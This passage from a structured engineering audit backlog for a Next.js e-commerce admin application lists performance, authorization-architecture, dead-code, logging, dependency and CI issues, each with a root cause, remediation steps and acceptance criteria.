- [ ] Completed

---

### PERF-012 — Loading and error boundaries are missing on detail routes

**Priority:** P2
**Category:** Performance
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/products/[id]/loading.tsx        (missing)
src/app/products/[id]/error.tsx          (missing)
src/app/orders/[id]/loading.tsx          (missing)
src/app/orders/[id]/error.tsx            (missing)
src/app/customers/[id]/loading.tsx       (missing)
src/app/customers/[id]/error.tsx         (missing)
src/app/products/new/loading.tsx         (missing)
```

**Problem Description:**
`loading.tsx` exists for 12 top-level routes (verified: `categories, coupons, customers, engraving, inventory, orders, payment-methods, payments, products, settings, shipping, root`) but **not** for the dynamic detail routes or `products/new`. `error.tsx` exists only at the root. Navigating to an order detail therefore blocks on the full server round-trip with no skeleton, and a render error falls back to the root boundary, losing navigation context.

**Current Implementation:**
`find src/app -name "loading.tsx"` → 12 files, none under `[id]` or `new`. `find src/app -name "error.tsx"` → only `src/app/error.tsx`.

**Root Cause:**
Loading skeletons were added per top-level route during the RSC migration; nested routes were not revisited.

**Real-World Failure Scenario:**
Clicking an order from the list takes as long as the detail query (see BUG-016: `findById` runs 8+ sequential queries) with a frozen UI and no feedback — users click twice and open two tabs.

**Required Implementation:**

1. Add `loading.tsx` to `orders/[id]`, `products/[id]`, `products/[id]/edit`, `products/new`, `customers/[id]`, reusing the existing skeleton components from `src/app/loading.tsx` and the top-level files. Match the real layout shape (header, cards, table) so the transition does not jump.
2. Add `error.tsx` to the same routes, returning a sanitised message (SEC-012 rules) plus a "Back to list" link and `reset()`.
3. Do not add artificial delays (BUG-034 removes the only simulated loading).
4. Verify streaming actually occurs: the detail page must not await everything before the first byte. If `generateMetadata` performs a duplicate `getOrderById` (it does — `orders/[id]/page.tsx:15-27` and again in `Page`), wrap it with `cache()` so metadata + page share one query.

**Expected Behavior After Fix:**
Every navigation shows a skeleton immediately and renders errors within the route's layout.

**Dependencies:**
- **Related** BUG-016/BUG-034 (detail query cost), SEC-012.

**Testing Requirements:**
- Throttled navigation to `/orders/[id]` shows a skeleton within 100 ms.
- `generateMetadata` + page execute `getOrderById` once (query count).
- Forced error renders the route-level boundary with navigation intact.
- No layout shift when data arrives.

**Acceptance Criteria:**
- [ ] Six new loading boundaries.
- [ ] Route-level error boundaries.
- [ ] Duplicate metadata query removed.
- [ ] No artificial delays.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

## 6.5 Architecture and Infrastructure Issues

---

### ARCH-001 — Two parallel authorization stacks with different failure semantics

**Priority:** P1
**Category:** Architecture
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/auth.ts
src/lib/auth-guard.ts
src/actions/media.ts
src/app/api/upload/auth/route.ts
src/app/api/auth/verify/route.ts
```

**Problem Description:**
Two guards implement the same concept differently:

| | `src/server/auth.ts` | `src/lib/auth-guard.ts` |
|---|---|---|
| Failure mode | throws `AuthenticationError` / `AuthorizationError` | calls `redirect()` |
| Role default | `"staff"` for unknown | `"staff"` for missing |
| Redisplays as | `{ success: false }` from `createSafeAction` | HTTP 307 to `/login` |
| Used by | every service, every action via `createSafeAction`, every RSC page | `src/actions/media.ts`, `/api/upload/auth`, `/api/auth/verify` |

Because `redirect()` throws a `NEXT_REDIRECT` control-flow error, the guard-based stack behaves badly outside RSC: a route handler that calls it returns a redirect the client interprets as HTML, and `uploadServerMediaAction`'s `catch` swallows `NEXT_REDIRECT` and returns `{ error: "NEXT_REDIRECT" }` to the browser.

**Current Implementation:**
`src/lib/auth-guard.ts` — `getSession`, `requireAuth`, `requireRole`, `requireStaff`, `requireAdmin`, `requireSuperAdmin`, `hasMinimumRole`. `src/server/auth.ts` — `getCurrentAdmin`, `assertRole`, `requireStaffContext`, `requireAdminContext`, `requireSuperAdminContext`, plus `hasMinimumRole`-equivalent hierarchy via `assertRole`.

`src/actions/media.ts` imports from `auth-guard`; `src/app/api/upload/auth/route.ts` imports `getSession` from it. Everything else imports `src/server/auth.ts`.

**Root Cause:**
`auth-guard.ts` predates the action wrapper; `server/auth.ts` was introduced with `createSafeAction` and the RSC migration. The old module was never retired because two API routes and one action still referenced it.

**Real-World Failure Scenario:**
A staff user with an expired session calls `uploadServerMediaAction`. The guard's `redirect("/login")` throws `NEXT_REDIRECT`; the action's `catch (err)` returns `{ success: false, error: "NEXT_REDIRECT" }`. The uploader shows a red toast reading "NEXT_REDIRECT" and does not navigate to login. This was verified at `src/actions/media.ts:87-91` — the catch does not rethrow the redirect.

**Required Implementation:**

1. **Designate `src/server/auth.ts` as the only auth module.** It is error-based, composable, and already used by 95% of the codebase.
2. Add a thin RSC/page adapter inside `src/server/auth.ts`:
   ```ts
   export async function requirePage(role: AdminRole = "staff"): Promise<AdminContext> {
     try { return role === "super_admin" ? await requireSuperAdminContext({ redirect: false })
                 : role === "admin" ? await requireAdminContext({ redirect: false })
                 : await requireStaffContext({ redirect: false }); }
     catch (err) {
       if (err instanceof AuthenticationError) redirect("/login?error=session");
       redirect("/login?error=forbidden");
     }
   }
   ```
   Pages call `requirePage()`; actions/route handlers call the context functions with `{ redirect: false }`.
3. Delete `src/lib/auth-guard.ts` after migrating its three consumers:
   - `src/actions/media.ts` → convert to `createSafeAction` (SEC-012) which uses `server/auth.ts`.
   - `src/app/api/upload/auth/route.ts` → `requireStaffContext({ redirect: false })` (SEC-005).
   - `src/app/api/auth/verify/route.ts` → deleted (SEC-001).
4. **Never call `redirect()` from an action or route handler.** Document this rule in `docs/ai-context/AUTH_CONTEXT.md` and add a lint rule or CI grep (TEST-006).
5. Where a `NEXT_REDIRECT` may still pass through a `catch`, rethrow it:
   ```ts
   if (err && typeof err === "object" && "digest" in err && String(err.digest).startsWith("NEXT_REDIRECT")) throw err;
   ```
   (`requireStaffContext` already does this internally — verify every other catch.)

**Expected Behavior After Fix:**
One auth module, one failure model. Actions return typed errors, pages redirect, route handlers return JSON. No control-flow error can be stringified into a user-facing message.

**Dependencies:**
- **Blocks** SEC-004, SEC-005, SEC-012 cleanly.
- **Related** ARCH-003.

**Testing Requirements:**
- Every action returns `{ success: false, code }` when unauthenticated (no redirect errors).
- Every page redirects to `/login` when unauthenticated.
- Every API route returns `401`/`403` JSON.
- `grep -rn "lib/auth-guard" src/` → no matches after removal.
- No action returns a string containing `NEXT_REDIRECT`.

**Acceptance Criteria:**
- [x] Single auth module.
- [x] Page adapter implemented.
- [x] `auth-guard.ts` removed.
- [x] Redirect-in-action rule documented and linted.
- [x] Redirect errors rethrown everywhere.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### ARCH-002 — Redundant `/api/inventory*` routes violate ADR 019 and break on auth failure

**Priority:** P2
**Category:** Architecture
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/api/inventory/route.ts
src/app/api/inventory/adjust/route.ts
src/app/api/inventory/movements/route.ts
src/actions/inventory.ts
docs/ai-context/DECISIONS.md
```

**Problem Description:**
ADR 019 states: "Server Actions First for Admin Mutations and Direct Service Calls in RSC (No Redundant Route Handlers)." Three inventory route handlers exist anyway, duplicating functionality already exposed by `src/actions/inventory.ts` (`getInventoryAction`, `getInventoryMovementsAction`, `adjustStockAction`, `restockAction`).

`/api/inventory/adjust` has an additional defect: it calls `requireAdminContext()` **without** `{ redirect: false }`. For an unauthenticated or `staff` caller the guard calls `redirect()`, throws `NEXT_REDIRECT`, and `handleApiError` does not recognise it (`AppError`? no; `ZodError`? no) so it falls through to `console.error` + `500 INTERNAL_SERVER_ERROR`. The correct response is `401`/`403`.

**Current Implementation:**
`src/app/api/inventory/adjust/route.ts:51`: `const admin = await requireAdminContext();` — the other two routes correctly pass `{ redirect: false }` (`route.ts:51`, `movements/route.ts:51`).
No view calls any of these routes: `grep -rn "api/inventory" src/views src/components` → no matches. They are dead HTTP surface.

**Root Cause:**
The routes were written before ADR 019 was adopted; the views were migrated to Server Actions and the routes were left behind.

**Real-World Failure Scenario:**
A penetration test or monitoring probe hits `/api/inventory/adjust` without a session and receives a `500`, which looks like a server fault and pages the on-call engineer. Separately, the endpoint is an unmonitored second write path to inventory that no UI exercises — meaning a bug fixed in the action layer may not be fixed here.

**Required Implementation:**

1. **Confirm zero usage** (`grep`, plus a week of access-log review — **requires log access; mark Not Verified without it**).
2. Delete all three route files. Their logic is fully covered by:
   - `getInventoryAction`, `getInventoryMovementsAction` (reads),
   - `adjustStockAction`, `restockAction` (writes).
3. Update `docs/ai-context/ARCHITECTURE.md` and `DECISIONS.md` (ADR 019) to state that no `/api/inventory*` handlers exist.
4. If any external integration *does* consume them (verify before deleting), keep them but: pass `{ redirect: false }`, map `AuthenticationError → 401` and `AuthorizationError → 403`, and register them in the ADR as an approved exception with a named consumer.
5. If a programmatic (non-browser) inventory API is genuinely required, it must be a versioned route under `/api/v1/…` with token auth — **not** an unauthenticated-to-session hybrid. Record as a follow-up, do not build it now.

**Expected Behavior After Fix:**
No duplicate HTTP write path exists; inventory writes go through one action; unauthenticated API calls return `401`, never `500`.

**Dependencies:**
- **Depends on** SEC-011 (proxy must return `401` for API paths, so removing the routes is safe).
- **Related** ARCH-001.

**Testing Requirements:**
- All three paths return `404`.
- Inventory read/adjust/restock still work from the UI.
- `grep -rn "api/inventory" src/` → no matches.
- Protected route test suite still passes.

**Acceptance Criteria:**
- [ ] Usage confirmed (or exception documented).
- [ ] Routes removed.
- [ ] ADR updated.
- [ ] UI unaffected.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ARCH-003 — `createSafeAction` invents an "anonymous staff" context

**Priority:** P1
**Category:** Architecture
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/action-client.ts
src/server/types.ts
```

**Problem Description:**
When `requiredRole: null` is configured (intended for public actions), `createSafeAction` constructs a **fake authenticated principal**:
```ts
let admin: AdminContext = {
  id: "anonymous",
  email: "anonymous@scrubx.pk",
  name: "Anonymous User",
  role: "staff",          // ← a fabricated staff role
};
```
Any action configured as public therefore runs as `staff`. If such an action later calls a service (most services call `assertRole`), it will pass `assertRole(admin, ["staff"])` — a privilege escalation by construction. Even if no action uses it today (`grep -rn "requiredRole: null" src/actions` → no matches), the wrapper is a loaded gun: the next developer who needs a public action will reach for `requiredRole: null`.

**Current Implementation:**
`src/server/action-client.ts:45-62`. The fabricated role is `"staff"`, the lowest *privileged* role.

**Root Cause:**
The wrapper needed an `AdminContext` for the handler signature and defaulted instead of making the anonymous case explicit in the type.

**Real-World Failure Scenario:**
A future "contact us" or "check order status by number" public action is declared with `requiredRole: null`. It calls `orderService.getOrderById(id, admin)` — which asserts `staff` — and the fabricated context passes. The action now exposes any order to an unauthenticated caller.

**Required Implementation:**

1. Change the handler signature so the anonymous case is **unrepresentable**:
   ```ts
   type ActionParams<TInput> =
     | { input: TInput; admin: AdminContext; anonymous?: never }
     | { input: TInput; admin?: never; anonymous: true };
   ```
   Simpler and preferred: **remove `requiredRole: null` entirely**. Every action in this application requires at least `staff`. If a public action is ever needed, it gets its own wrapper (`createPublicAction`) with no `admin` in scope and an explicit threat-model note.
2. Delete the fabricated context block. If `requiredRole` is omitted, default to `"staff"` and always call `getCurrentAdmin()`.
3. Add an assertion that `admin.id !== "anonymous"` at handler entry (defence in depth).
4. Add a unit test: an action with `requiredRole` omitted rejects an unauthenticated call.
5. Document in `docs/ai-context/ARCHITECTURE.md`: "There is no anonymous Server Action. Public endpoints must be route handlers with their own review."

**Expected Behavior After Fix:**
No code path can obtain an `AdminContext` without a real session. A public action is structurally impossible through `createSafeAction`.

**Dependencies:**
- **Related** ARCH-001, SEC-004.

**Testing Requirements:**
- Unauthenticated action call → `{ success: false, code: "UNAUTHORIZED" }`.
- `grep -rn "anonymous" src/server/action-client.ts` → no fabricated principal.
- All existing actions still work.
- Type-level: a handler cannot access `admin` when no role is configured (compile error if attempted).

**Acceptance Criteria:**
- [x] No fabricated `AdminContext`.
- [x] `requiredRole: null` removed or gated behind a separate wrapper.
- [x] Assertion at handler entry.
- [x] Test coverage.
- [x] Documented.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### ARCH-004 — Dead code: `src/data/mock.ts`, `src/data/store.tsx` and constants for a removed UI

**Priority:** P2
**Category:** Architecture
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/data/mock.ts
src/data/store.tsx
src/lib/constants.ts
src/components/providers.tsx
docs/ai-context/{ARCHITECTURE,PENDING_TASKS,PROJECT_OVERVIEW}.md
```

**Problem Description:**
`src/data/mock.ts` (56 KB) and `src/data/store.tsx` (15 KB) are shipped in the repository and are **not imported by any file** (`grep -rn "data/mock\|data/store\|useStore\|StoreProvider" src/` → no matches outside the docs). `src/lib/constants.ts` still exports `COLOR_LIBRARY` (12 mock colour ids like `col-teal`), `ORDER_STATUS_LABEL`, `ORDER_STATUS_ORDER`, `PAYMENT_METHOD_LABEL` — and the `col-*` ids are the source of the local colour keys that BUG-019 mishandles.

The documentation still tells future agents to preserve this code (`PROJECT_OVERVIEW.md:69`, `ARCHITECTURE.md:16,224`, `PENDING_TASKS.md:186`), so it will be preserved forever by rule-following agents.

**Current Implementation:**
`src/data/*` exists; `constants.ts` exports the mock colour library which `ProductForm.tsx` may still use for the colour picker (verify at implementation time: `grep -n "COLOR_LIBRARY" src/`).

**Root Cause:**
The migration from the localStorage prototype was completed for the views but the prototype's data layer was never deleted, and the docs were never updated to reflect completion.

**Real-World Failure Scenario:**
A new agent reads `PROJECT_OVERVIEW.md:69` ("mock data must remain functional") and spends effort keeping `src/data/store.tsx` type-checking. Worse, `COLOR_LIBRARY`'s `col-*` identifiers leak into the persistence layer and produce the non-UUID colour bug (BUG-019).

**Required Implementation:**

1. Verify zero imports (`grep`), then delete `src/data/mock.ts` and `src/data/store.tsx`, and remove `StoreProvider` from `src/components/providers.tsx` **if present** (verified: it is not present — `providers.tsx` only wraps `ToastProvider` and `TooltipProvider`).
2. Decide `COLOR_LIBRARY`'s fate:
   - If the colour picker uses it, keep it **as UI-only swatches** but stop persisting `col-*` ids (BUG-019 handles persistence).
   - If unused, delete it.
3. Update the documentation:
   - `PROJECT_OVERVIEW.md`: replace the "must remain functional" restriction with "the prototype data layer has been removed".
   - `ARCHITECTURE.md`: delete the `LegacyStore` diagram node and the transitional-state paragraph.
   - `PENDING_TASKS.md`: tick "Decommission `src/data/mock.ts` and `src/data/store.tsx`".
4. This is a documentation truthfulness fix as much as a code cleanup; do not delete docs, correct them.

**Expected Behavior After Fix:**
No dead prototype code ships; docs describe the current architecture.

**Dependencies:**
- **Related** ARCH-007 (unused packages), BUG-019.

**Testing Requirements:**
- `grep -rn "data/mock\|data/store\|useStore" src/` → no matches.
- Type-check and lint pass.
- Every page still renders (the removal must be inert).
- Docs contain no reference to the removed files.

**Acceptance Criteria:**
- [ ] Both files deleted.
- [ ] `COLOR_LIBRARY` decision recorded.
- [ ] Three docs corrected.
- [ ] No functional change.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ARCH-005 — Two divergent order FSMs (server and client)

**Priority:** P1
**Category:** Architecture
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/views/OrderDetail.tsx
src/lib/types.ts
```

**Problem Description:**
The order state machine is defined **twice**, and the two definitions already disagree:

Server (`order.service.ts:42-53`):
```ts
awaiting_payment: ["payment_submitted", "confirmed", "cancelled"],
payment_submitted: ["confirmed", "awaiting_payment", "cancelled"],
pending: ["confirmed", "cancelled"],
confirmed: ["processing", "cancelled"],
processing: ["shipped", "cancelled"],
shipped: ["delivered", "cancelled", "refunded"],
delivered: ["refunded"],
cancelled: [], refunded: [],
```
Client (`OrderDetail.tsx:121-131`):
```ts
awaiting_payment: ["confirmed", "cancelled"],
payment_submitted: ["confirmed", "awaiting_payment", "cancelled"],
pending_cod: ["confirmed", "cancelled"],
confirmed: ["processing", "cancelled"],
processing: ["shipped", "cancelled"],
shipped: ["delivered", "cancelled"],
delivered: ["refunded"],
cancelled: [], refunded: [],
```
Differences: the client omits `payment_submitted` for `awaiting_payment`; omits `refunded` for `shipped`; uses `pending_cod` instead of `pending`; and has no `awaiting_payment` return edge from `confirmed`.

**Current Implementation:**
Both tables are hardcoded in their files. `src/lib/types.ts` defines `OrderStatus` including both `pending` and `pending_cod` (the DTO maps `pending → pending_cod` at `dto.ts:330`).

**Root Cause:**
The client table was transcribed from the server table before `refunded` and `payment_submitted` transitions were added server-side, and the `pending`/`pending_cod` naming divergence (`dto.ts:330` rewrites it) made comparison hard.

**Real-World Failure Scenario:**
An admin opens a `shipped` order. The server permits `shipped → refunded`, but the UI does not render a Refund action for that state, so the only way to refund a shipped order is to first mark it delivered — which is false data in the ledger and triggers `delivered_at`. Conversely, `awaiting_payment → payment_submitted` is legal server-side but not offered in the UI.

**Required Implementation:**

1. Create `src/lib/order-status.ts` — a pure, isomorphic module (no server imports) exporting:
   ```ts
   export const ORDER_STATUSES = [...] as const;
   export const ALLOWED_STATUS_TRANSITIONS: Record<OrderStatus, OrderStatus[]> = {...};
   export function canTransition(from: OrderStatus, to: OrderStatus): boolean;
   export function nextStatuses(from: OrderStatus): OrderStatus[];
   ```
   It must be importable by both `order.service.ts` and `OrderDetail.tsx` (no `db` imports, no `"use server"`).
2. Move the server table into this module and make `order.service.ts` import it (delete the local copy).
3. Make `OrderDetail.tsx` import it and delete its local copy.
4. Resolve the `pending` vs `pending_cod` naming once: keep `pending` as the DB/domain value and keep `pending_cod` **only** as a display label. Update `dto.ts:330` to stop rewriting the status value — instead map the label in the view. (Verify all consumers of `pending_cod` before changing; `ORDER_STATUS_LABEL` in `constants.ts` has it.)
5. Add a test that asserts the client and server derive from the same module (trivially true after refactor) and a snapshot test of the transition table.

**Expected Behavior After Fix:**
There is one transition table. The UI offers exactly the transitions the server will accept, and the server accepts exactly what the UI offers.

**Dependencies:**
- **Depends on** BUG-006 (which changes the shipping transitions), BUG-012 (preconditions).
- **Related** SEC-013 (same "one source of truth" pattern).

**Testing Requirements:**
- For every status, `nextStatuses(s)` equals the set the server accepts (property test).
- UI actions match the table for all 9 statuses.
- `grep -c "ALLOWED_STATUS_TRANSITIONS"` in the codebase → one definition.
- No `pending_cod` value is ever written to the DB.

**Acceptance Criteria:**
- [ ] Single shared module.
- [ ] Both sides import it.
- [ ] Naming resolved.
- [ ] Property test passes.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ARCH-006 — No structured logging or error reporting

**Priority:** P2
**Category:** Architecture
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/action-client.ts
src/server/errors.ts
src/app/error.tsx
src/app/api/*/route.ts
src/app/layout.tsx
```

**Problem Description:**
Observability consists of `console.error` / `console.warn` with ad-hoc string prefixes (`"[Order Page Error]"`, `"[ImageKit Purge Warning]"`, `"[API Error - POST /api/inventory/adjust]"`). Failures are invisible unless someone watches the server log; there is no correlation id, no severity, no structured fields, and no error aggregation. Several catch blocks swallow errors entirely (layout badges, `safeDeleteImageKitFile`, client media deletion).

**Current Implementation:**
Verified `console.error`/`console.warn` in at least 15 files; no logger module exists (`grep -rn "logger\|pino\|winston\|sentry" src/ package.json` → no matches). `src/app/error.tsx:14` logs and exposes nothing to the operator beyond a client-side console line.

**Root Cause:**
Logging was never designed; `console` was available and adequate during development.

**Real-World Failure Scenario:**
A payment approval fails in production at 02:00. The user sees "Something went wrong". The server log contains `[API Error]` with an object dump and no request id, no order id, and no way to correlate with the user's report. The incident takes hours to reconstruct — or is never diagnosed.

**Required Implementation:**

1. Add `src/server/logger.ts` — no new dependency:
   ```ts
   type Level = "debug" | "info" | "warn" | "error";
   export function log(level: Level, event: string, fields: Record<string, unknown> = {}) {
     const line = JSON.stringify({ ts: new Date().toISOString(), level, event, ...fields });
     (level === "error" ? console.error : level === "warn" ? console.warn : console.log)(line);
   }
   ```
   Include a `redact()` helper that strips keys matching `/password|secret|token|proof|iban|accountNumber/i` — **secrets must never be logged (Safety Rule 9)**.
2. Emit one structured line per failed action from `createSafeAction`: `{ event: "action.failed", action, code, adminId, durationMs }`. Never log input payloads wholesale.
3. In route handlers, log `{ event: "http.error", route, method, status, code }` with no request body.
4. Attach a `requestId` (from `crypto.randomUUID()`) per action/route invocation and include it in the user-facing error text alongside the digest, so support can match the report to the log.
5. Replace ad-hoc `console.*` calls with `log()` in the files listed above. Do **not** remove the `console.error` in `error.tsx` (client-side) — add the digest instead.
6. Do not add Sentry or any external service (Safety Rule 8). Record it as an optional follow-up in `docs/ai-context/ARCHITECTURE.md`.

**Expected Behavior After Fix:**
Every failure emits one JSON line with a stable event name and safe fields; a user can quote a request id that identifies the log line.

**Dependencies:**
- **Related** DB-014 (audit log is the durable record; logging is the operational one), SEC-012.

**Testing Requirements:**
- A failed action emits exactly one line with `event`, `code`, `adminId`, `requestId`.
- A secret in the payload is never present in any log line (test with a canary value).
- A successful action emits nothing at `warn`/`error`.
- Logs parse as JSON.

**Acceptance Criteria:**
- [ ] `logger.ts` with redaction.
- [ ] Action and route errors emit structured lines.
- [ ] Request id surfaced to the user.
- [ ] No secret can reach a log line.
- [ ] No new dependency.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ARCH-007 — Unused dependencies and bundle weight

**Priority:** P3
**Category:** Infrastructure
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
package.json
package-lock.json
src/components/ui/toast.tsx
src/views/*.tsx
```

**Problem Description:**
Three dependencies are installed but unused:
- `@imagekit/next` `^2.1.6` — no import anywhere (`grep -rn "@imagekit/next" src/` → no matches). The project uses `imagekit` (server) and a hand-rolled XHR client uploader instead.
- `date-fns` `^4.4.0` — no import anywhere (`grep -rn "date-fns" src/` → no matches). Dates are formatted with `Intl`/`toLocaleDateString` and a local `src/lib/format.ts`.
- `react-is` `^19.3.0` — no import in `src/`; it is a transitive requirement of `recharts`/Radix but is declared as a direct dependency, which pins it independently of its consumers.

`framer-motion` is used by exactly one file (`toast.tsx`) and is removable (PERF-008).

**Current Implementation:**
`package.json` dependencies block, verified line by line against imports across `src/`.

**Root Cause:**
Dependencies were added speculatively (an ImageKit Next.js integration that was never adopted, a date library that was replaced by `Intl`).

**Real-World Failure Scenario:**
Every `npm ci` installs and every vulnerability scan reports on packages that are not executed. An advisory in `date-fns` would require emergency action for code that does not run. Bundle audits are noisy and reviewers cannot tell which dependencies are real.

**Required Implementation:**

1. Re-verify usage with `grep -rn "<pkg>" src/` for each candidate **at implementation time** (the tree may have moved).
2. Remove `@imagekit/next` and `date-fns` from `dependencies`; run `npm install` to update the lockfile.
3. Move `react-is` to `devDependencies` **only if** it is genuinely unused at runtime; otherwise leave it but add a comment in `package.json` (JSON does not support comments — record the rationale in `docs/ai-context/ARCHITECTURE.md` instead). Safer: leave `react-is` alone in this issue and record it as "transitive, kept for peer resolution".
4. Remove `framer-motion` only after PERF-008 replaces it in `toast.tsx`.
5. Add a CI check (TEST-006) for unused direct dependencies — e.g. a simple script that greps each dependency name across `src/` and reports zero-use entries for human review. Do **not** auto-remove.

**Expected Behavior After Fix:**
Declared dependencies match executed code; installs are smaller and audits are meaningful.

**Dependencies:**
- **Depends on** PERF-008 (framer-motion removal).
- **Related** ARCH-008.

**Testing Requirements:**
- `npm ci --legacy-peer-deps` succeeds after removals.
- `npm run build` succeeds.
- No import resolves to a removed package.
- Lockfile diff contains no unexpected upgrades.

**Acceptance Criteria:**
- [ ] Two packages removed.
- [ ] `framer-motion` removal coordinated with PERF-008.
- [ ] `react-is` decision recorded.
- [ ] Build and type-check pass.
- [ ] CI unused-dependency report exists.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ARCH-008 — Peer-dependency conflict forces `--legacy-peer-deps`; 15 audit advisories

**Priority:** P1
**Category:** Infrastructure
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
package.json
package-lock.json
docs/ai-context/PENDING_TASKS.md
```

**Problem Description:**
Two problems.

(a) **Peer conflict.** `npm ci --ignore-scripts` fails with `ERESOLVE`: `better-auth@1.7.17` declares peer requirements on `drizzle-orm@^0.45.2` and `drizzle-kit@>=0.31.4`, while the project pins `drizzle-orm@^0.38.4` and `drizzle-kit@^0.30.2`. Every install therefore requires `--legacy-peer-deps`, which **disables peer validation for the entire tree** — not just the conflicting package. That is a supply-chain-blindfolding flag: a genuinely incompatible peer dependency introduced later will install silently and fail at runtime.

(b) **Advisories.** `npm audit --json` reports **15 vulnerabilities: 1 high, 14 moderate**. The specific advisories were not triaged.

**Current Implementation:**
`package.json` dependency versions as listed in §1.2. `docs/ai-context/PENDING_TASKS.md` documents the peer-dependency flag as a known warning.

**Root Cause:**
`better-auth` was upgraded (or Drizzle was not) without reconciling the peer range; the flag became the permanent workaround. Audit output was noted but never triaged.

**Real-World Failure Scenario:**
A Drizzle API that `better-auth`'s adapter relies on changed between `0.38` and `0.45`. Under `--legacy-peer-deps` the mismatch installs; the failure appears at runtime in a session query, not at install time. Meanwhile an advisory in a transitive dependency of a package that *is* executed goes unpatchable because upgrading it would break the peer graph that is already being ignored.

**Required Implementation:**

1. **Triage the advisories.** For each of the 15, record: package, severity, advisory id, whether the vulnerable code path is reachable in this app, and the fix version. Produce a table in `docs/ai-context/PENDING_TASKS.md`. Do not bulk-`npm audit fix --force`.
2. **Resolve the peer conflict properly.** Upgrade `drizzle-orm` and `drizzle-kit` to versions satisfying `better-auth`'s peers (`drizzle-orm@^0.45.x`, `drizzle-kit@>=0.31.x`). This is a **breaking-ish** upgrade: re-verify the schema API (`src/db/schema/*`), `.for("update")` usage, `leftJoin` typing, `sql` templating, and re-run `tsc --noEmit` plus every `src/scripts/test-*.ts`. Record any API change in the ADR log.
   - If the upgrade is not feasible in this phase: pin `better-auth` to a version whose peers match `drizzle-orm@0.38` (check `npm view better-auth@<v> peerDependencies`), which is the smaller, safer change.
3. Only after the graph is consistent: remove the need for `--legacy-peer-deps` and update every documented command (`README.md`, `docs/ai-context/*`, §14) to plain `npm ci`.
4. Add a CI step that runs `npm ci` **without** the flag; it must be green or the build fails (this is the guard against regression).
5. Record the final, applied fixes per advisory.

**Expected Behavior After Fix:**
`npm ci` succeeds without flags; `npm audit` reports zero un-triaged advisories, with any accepted ones documented and justified.

**Dependencies:**
- **Blocks** ARCH-009 (CI must run a clean install).
- **Related** ARCH-007.

**Testing Requirements:**
- `npm ci` (no flags) → success.
- `tsc --noEmit` → 0 errors.
- All `npm run *:test` scripts pass against a staging DB.
- `npm audit` → 0 un-triaged findings.
- App boots and signs in.

**Acceptance Criteria:**
- [ ] Every advisory triaged in a table.
- [ ] Peer graph consistent without `--legacy-peer-deps`.
- [ ] Docs updated to plain `npm ci`.
- [ ] CI enforces the clean install.
- [ ] No `--force` used.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ARCH-009 — No CI/CD pipeline of any kind

**Priority:** P1
**Category:** Infrastructure
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
.github/workflows/            (absent)
package.json
```

**Problem Description:**
There is no `.github/` directory. Nothing runs type-check, lint, build, tests, migration dry-run, or dependency audit on a pull request. The only quality gate is a human remembering to run `./node_modules/.bin/tsc --noEmit`. `npm run build` has been run manually; migrations have never been validated in automation.

**Current Implementation:**
`ls .github` → absent. `package.json` has scripts for all checks (`lint`, `build`, `db:parity`, `db:integrity`, `*:test`) but no orchestration.

**Root Cause:**
The project has been developed as a single-developer effort without a PR workflow.

**Real-World Failure Scenario:**
A change to `src/server/auth.ts` compiles but breaks the `customer → staff` guard. Nothing catches it until a production incident. A migration with a syntax error is merged and discovered when someone runs `db:migrate` against the live database.

**Required Implementation:**

1. Add `.github/workflows/ci.yml` with jobs:
   - **install-and-verify**: `npm ci` (no legacy flag after ARCH-008), `tsc --noEmit`, `eslint .`, `next build`.
   - **audit**: `npm audit --audit-level=high` (fails on high; moderate reported but non-blocking until ARCH-008 completes).
   - **schema-parity**: `npm run db:parity` against an ephemeral Postgres service container seeded with the migrations (`npm run db:migrate` then `npm run db:parity`).
   - **test** (after TEST-001): `npm test`.
2. Use a Postgres service container (`postgres:17`) with `DATABASE_URL` pointing at it; run migrations as part of the job. No production secrets.
3. Cache `~/.npm` keyed on `package-lock.json`.
4. Add a required status check on `main` (repository settings — document as a manual step in §14; **cannot be set from code**).
5. Add `.github/pull_request_template.md` with the Definition of Done from §4.3.
6. Add branch protection documentation to `docs/ai-context/ARCHITECTURE.md`.
7. Do not add deployment automation in this issue — build/verify only.

**Expected Behavior After Fix:**
Every push runs install, types, lint, build, schema parity and tests against a real Postgres; a red build blocks merge.

**Dependencies:**
- **Depends on** ARCH-008 (clean install), TEST-001 (test runner), DB-015 (migrations runnable).
- **Related** TEST-006/SEC-001 CI guards.

**Testing Requirements:**
- A deliberately broken type-check fails the job.
- A deliberately failing test fails the job.
- A schema/Drizzle mismatch fails `db:parity`.
- Green run on `main`.
- No secrets present in workflow definitions.

**Acceptance Criteria:**
- [ ] Workflow file with the four jobs.
- [ ] Service container Postgres.
- [ ] Cache configured.
- [ ] PR template added.
- [ ] Branch protection documented (manual step flagged).

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

